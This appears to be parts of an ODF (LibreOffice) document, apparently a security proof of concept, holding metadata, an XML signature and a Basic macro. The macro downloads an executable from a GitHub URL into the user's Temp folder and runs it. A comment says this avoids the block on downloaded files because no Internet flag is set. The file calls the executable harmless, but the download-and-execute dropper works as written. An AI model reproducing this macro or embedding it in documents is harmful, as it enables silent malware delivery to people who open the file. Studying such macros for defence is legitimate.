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ocument downloads a harmless .exe file and executes it via macro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8:48:00.762000000</meta:creation-date>
    <dc:date>2021-10-12T19:28:24.978000000</dc:date>
    <meta:editing-duration>PT39M23S</meta:editing-duration>
    <meta:editing-cycles>2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27" meta:character-count="167" meta:non-whitespace-character-count="14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
	Dim oSFA As Object, oOutStream as Object, oOutText as Object
	Dim sFilePath as String
	Dim oSvc as object
	
  	oSvc = createUNOService("com.sun.star.system.SystemShellExecute")
	oSFA = createUNOService ("com.sun.star.ucb.SimpleFileAccess")
	
	sFilePath = "C:\Users\" + environ("USERNAME") + "\AppData\Local\Temp\odfexample.exe"
	If oSFA.exists(sFilePath) Then
		oSFA.kill(sFilePath) 'if file exists, delete it
	End If
	
	DownloadFile("https://github.com/attodf/odf-test/raw/main/odfexample.exe", sFilePath)
	Beep
	oSvc.execute(ConvertToUrl(sFilePath), "", 0)
	REM No Internet flag is set and thus the execution is not blocked.
	
End Sub

	Private Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
                       (ByVal pCaller As Long, _
                        ByVal szURL As String, _
                        ByVal szFileName As String, _
                        ByVal dwReserved As Long, _
                        ByVal lpfnCB As Long) As Long
                        

	Public Function DownloadFile (URL As String, LocalFilename As String) As Boolean 
	    Dim lngRetVal As Long
	    lngRetVal = URLDownloadToFile(0, URL, LocalFilename, 0, 0) 
	    If lngRetVal = 0 Then DownloadFile = True 
	End Function ' DownloadFi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usrkSV/9rltvfAmf4qMNxIjFW/PwvZJtMRZSlchJJkY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m8II0//1s8FjnEk0Axx9YEpOAeNjWgqOGTQYmzbGAmM=</DigestValue>
      </Reference>
    </SignedInfo>
    <SignatureValue>fjgDLB51aPact4v0pmnMWr0Htl0AFf7f/8zzhGq4twzOMNU8yTdJ7ZixG2krlWwe
PzA1LH6pIVdOQXeAvo/yZ+SAbTYe+2qg93k0/0UcxhlA5L0p//hGZ4SGxMxy7CAC
mjuEqbRml/A5yTr1VXqh+sGkGuBA9n3DaukAldI3romzrs7st3rcf6dGR+jaQIgG
C+LeqcEjQWZXRuVXQt5TTXVlxKxoWSXJqNkP1ETHHNQx8u7dhRHK5gFtSM3QAKMu
EZl2942JIs3fCD18761iWErrWsSknqEdqkjXY47+x7tRkhsMAPRq9w7Odh53T8XS
84Kg0LxlnbFzNLOFTwrXA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